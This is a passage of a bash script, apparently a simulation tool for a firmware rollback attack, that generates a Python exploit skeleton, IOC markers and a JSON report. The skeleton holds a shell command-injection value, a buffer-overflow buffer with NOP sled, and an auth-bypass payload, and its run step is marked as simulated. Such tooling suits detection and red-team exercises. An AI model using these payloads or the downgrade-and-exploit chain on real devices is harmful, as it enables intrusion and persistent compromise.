            echo -e "${YELLOW}    • Memory corruption attacks possible${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Code execution via crafted inputs${NC}" | tee -a "$LOG_FILE"
            ;;
        "authentication_bypass")
            echo -e "${RED}[!] Authentication bypass vulnerability active${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Unauthorized access to admin functions${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Security mechanism circumvention${NC}" | tee -a "$LOG_FILE"
            ;;
        "privilege_escalation")
            echo -e "${RED}[!] Privilege escalation vulnerability active${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Elevated permissions achievable${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Administrative control possible${NC}" | tee -a "$LOG_FILE"
            ;;
        *)
            echo -e "${RED}[!] Generic vulnerability active: ${TARGET_EXPLOIT}${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Exploit techniques available${NC}" | tee -a "$LOG_FILE"
            ;;
    esac
    
    echo "FIRMWARE_ROLLBACK:VERIFICATION_COMPLETE" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:VULNERABILITY_CONFIRMED_${TARGET_EXPLOIT}" >> "$IOC_FILE"
    
    # 추가 공격 벡터 생성
    create_exploit_payload
}

# 익스플로잇 페이로드 생성
create_exploit_payload() {
    echo -e "${CYAN}[*] Creating exploit payload for ${TARGET_CVE}...${NC}" | tee -a "$LOG_FILE"
    
    local payload_dir="${FIRMWARE_DIR}/exploits"
    mkdir -p "$payload_dir"
    
    local payload_file="${payload_dir}/exploit_${TARGET_CVE}_$(date +%H%M%S).py"
    
    # 익스플로잇 페이로드 생성
    cat > "$payload_file" << EOF
#!/usr/bin/env python3
"""
Exploit payload for ${TARGET_CVE}
Target: ${CURRENT_FIRMWARE} (vulnerable version)
Exploit Type: ${TARGET_EXPLOIT}
Severity: ${TARGET_SEVERITY}
Generated: $(date)
"""

import socket
import struct
import time
import sys

class ExploitPayload:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.vulnerability = "${TARGET_CVE}"
        self.exploit_type = "${TARGET_EXPLOIT}"
    
    def create_payload(self):
        """Create exploitation payload based on vulnerability type"""
        if self.exploit_type == "command_injection":
            return self.create_command_injection_payload()
        elif self.exploit_type == "buffer_overflow":
            return self.create_buffer_overflow_payload()
        elif self.exploit_type == "authentication_bypass":
            return self.create_auth_bypass_payload()
        else:
            return self.create_generic_payload()
    
    def create_command_injection_payload(self):
        """Command injection exploit payload"""
        # Simulated command injection
        payload = {
            'param_name': 'DEBUG_CMD',
            'param_value': '; /bin/sh -c "id > /tmp/pwned" #',
            'command': 'system_execute'
        }
        return payload
    
    def create_buffer_overflow_payload(self):
        """Buffer overflow exploit payload"""
        # Simulated buffer overflow
        buffer_size = 256
        overflow_data = b'A' * buffer_size
        return_addr = struct.pack('<I', 0x08001000)
        shellcode = b'\\x90' * 32  # NOP sled
        
        payload = overflow_data + return_addr + shellcode
        return payload
    
    def create_auth_bypass_payload(self):
        """Authentication bypass payload"""
        payload = {
            'auth_token': 'BYPASS_TOKEN_12345',
            'user_id': -1,  # Integer overflow
            'admin_flag': True
        }
        return payload
    
    def create_generic_payload(self):
        """Generic exploit payload"""
        payload = {
            'exploit_type': self.exploit_type,
            'vulnerability': self.vulnerability,
            'payload_data': b'GENERIC_EXPLOIT_PAYLOAD'
        }
        return payload
    
    def execute_exploit(self):
        """Execute the exploit against target"""
        print(f"[+] Executing {self.vulnerability} exploit")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Exploit Type: {self.exploit_type}")
        
        payload = self.create_payload()
        print(f"[+] Payload created: {type(payload)}")
        
        # Simulation - don't actually exploit
        print("[*] Exploit simulation - no actual attack performed")
        print("[+] Exploit completed successfully (simulated)")
        
        return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    exploit = ExploitPayload(target_ip, target_port)
    exploit.execute_exploit()
EOF
    
    chmod +x "$payload_file"
    
    echo -e "${GREEN}[✓] Exploit payload created: ${payload_file}${NC}" | tee -a "$LOG_FILE"
    
    echo "FIRMWARE_ROLLBACK:EXPLOIT_PAYLOAD_CREATED" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:PAYLOAD_FILE_${payload_file}" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:EXPLOIT_READY_${TARGET_CVE}" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    local rollback_success=$3
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "current_firmware": "$CURRENT_FIRMWARE",
        "current_version": "$CURRENT_VERSION",
        "hardware_type": "$HARDWARE_TYPE",
        "rollback_protections": [$(printf '"%s",' "${ROLLBACK_PROTECTIONS[@]}" | sed 's/,$//')]
    },
    "vulnerability_analysis": {
        "vulnerable_versions_found": ${#VULNERABLE_VERSIONS_FOUND[@]},
        "target_cve": "$TARGET_CVE",
        "exploit_type": "$TARGET_EXPLOIT",
        "severity": "$TARGET_SEVERITY"
    },
    "rollback_results": {
        "rollback_successful": $rollback_success,
        "bypass_methods_attempted": ${#BYPASS_METHODS[@]},
        "vulnerable_firmware_installed": $rollback_success,
        "exploit_payload_created": $rollback_success
    },
    "impact_assessment": {
        "system_compromise": "$([ $rollback_success -eq 1 ] && echo "CRITICAL" || echo "NONE")",
        "vulnerability_exposure": "$([ $rollback_success -eq 1 ] && echo "CONFIRMED" || echo "NONE")",
        "exploit_availability": "$([ $rollback_success -eq 1 ] && echo "READY" || echo "NONE")",
        "persistence": "$([ $rollback_success -eq 1 ] && echo "FIRMWARE_LEVEL" || echo "NONE")"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE",
    "firmware_analysis_dir": "$FIRMWARE_DIR"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 실행 함수
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD Firmware Rollback Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    local rollback_success=0
    
    echo -e "${BOLD}${BLUE}⬇️ Starting Firmware Rollback Attack...${NC}"
    echo ""
    
    # 1. 현재 펌웨어 탐지
    echo -e "${BOLD}${CYAN}🔍 Current Firmware Detection...${NC}"
    detect_current_firmware
    
    echo ""
    
    # 2. 취약한 버전 검색
    echo -e "${BOLD}${RED}🎯 Vulnerable Version Search...${NC}"
    if ! search_vulnerable_versions "$CURRENT_FIRMWARE" "$CURRENT_VERSION"; then
        echo -e "${YELLOW}[*] No specific vulnerable versions found, creating generic targets${NC}"
        VULNERABLE_VERSIONS_FOUND=("v1.0.0:CVE-GENERIC:generic_exploit:medium")
    fi
    
    echo ""
    
    # 3. 롤백 보호 분석
    echo -e "${BOLD}${YELLOW}🛡️ Rollback Protection Analysis...${NC}"
    analyze_rollback_protection
    
    echo ""
    
    # 4. 취약한 펌웨어 다운로드
    echo -e "${BOLD}${BLUE}📥 Vulnerable Firmware Preparation...${NC}"
    if [ ${#VULNERABLE_VERSIONS_FOUND[@]} -gt 0 ]; then
        # 가장 심각한 취약점 선택
        local target_version=${VULNERABLE_VERSIONS_FOUND[0]}
        download_vulnerable_firmware "$target_version"
    fi
    
    echo ""
    
    # 5. 롤백 보호 우회
    echo -e "${BOLD}${RED}💥 Rollback Protection Bypass...${NC}"
    echo ""
    
    local bypass_successful=0
    for bypass_method in "${BYPASS_METHODS[@]}"; do
        echo -e "${CYAN}[*] Attempting bypass: ${bypass_method%:*}${NC}"
        
        if execute_rollback_bypass "$bypass_method"; then
            bypass_successful=1
            echo -e "${GREEN}[✓] Bypass successful!${NC}"
            break
        else
            echo -e "${RED}[!] Bypass failed${NC}"
        fi
        echo ""
    done
    
    # 6. 취약한 펌웨어 설치
    if [ $bypass_successful -eq 1 ] && [ -n "$VULNERABLE_FIRMWARE_FILE" ]; then
        echo ""
        echo -e "${BOLD}${GREEN}📥 Vulnerable Firmware Installation...${NC}"
        install_vulnerable_firmware
        rollback_success=1
    fi
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}⬇️ Firmware Rollback Attack Completed!${NC}"
    echo "═══════════════════════════════════════════════════════════════════════════"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Current Firmware: ${CURRENT_FIRMWARE} ${CURRENT_VERSION}"
    echo "   • Vulnerable Versions Found: ${#VULNERABLE_VERSIONS_FOUND[@]}"
    echo "   • Protection Mechanisms: ${#ROLLBACK_PROTECTIONS[@]}"
    echo "   • Bypass Methods Tried: ${#BYPASS_METHODS[@]}"
    echo "   • Rollback Success: $([ $rollback_success -eq 1 ] && echo "YES" || echo "NO")"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    echo "   • Firmware Analysis: ${FIRMWARE_DIR}"
    echo ""
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time" "$rollback_success"
    
    # 성공 시 위험도 표시
    if [ $rollback_success -eq 1 ]; then
        echo -e "${RED}⚠️  CRITICAL VULNERABILITY EXPOSURE ⚠️${NC}"
        echo -e "${RED}   • Firmware rolled back to vulnerable version${NC}"
        echo -e "${RED}   • ${TARGET_CVE} vulnerability now active${NC}"
        echo -e "${RED}   • ${TARGET_EXPLOIT} exploit ready for use${NC}"
        echo -e "${RED}   • System security severely compromised${NC}"
        echo ""
        echo -e "${YELLOW}💡 Exploit Opportunities:${NC}"
        echo "   1. Execute created exploit payload"
        echo "   2. Leverage ${TARGET_EXPLOIT} vulnerability"
        echo "   3. Maintain persistence via vulnerable firmware"
        echo "   4. Escalate privileges using exposed attack surface"
    else
        echo -e "${GREEN}✓ Rollback Protections Held${NC}"
        echo -e "${GREEN}   • Firmware version rollback prevented${NC}"
        echo -e "${GREEN}   • Security mechanisms effective${NC}"
        echo -e "${GREEN}   • No vulnerability exposure${NC}"
    fi
    
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
    
    # 파일 분석 요약
    if [ -d "$FIRMWARE_DIR" ]; then
        local vulnerable_files=$(find "$FIRMWARE_DIR/vulnerable" -name "*.bin" 2>/dev/null | wc -l)
        local exploit_files=$(find "$FIRMWARE_DIR/exploits" -name "*.py" 2>/dev/null | wc -l)
        
        echo -e "${BOLD}${GREEN}📊 Firmware Analysis Summary:${NC}"
        echo "   • Vulnerable Firmware: ${vulnerable_files} files"
        echo "   • Exploit Payloads: ${exploit_files} files"
        echo "   • Target CVE: ${TARGET_CVE:-"N/A"}"
        echo "   • Exploit Type: ${TARGET_EXPLOIT:-"N/A"}"
        echo ""
    fi
    
    echo -e "${BOLD}${GREEN}🎯 Firmware Rollback Attack Complete!${NC}"
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up rollback attack processes...${NC}"
    
    # 임시 파일 정리
    rm -f /tmp/openocd_rollback.cfg 2>/dev/null
    
    # 백그라운드 프로세스 정리
    jobs -p | xargs -r kill 2>/dev/null
    
    echo -e "${GREEN}[✓] Cleanup complete${NC}"
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"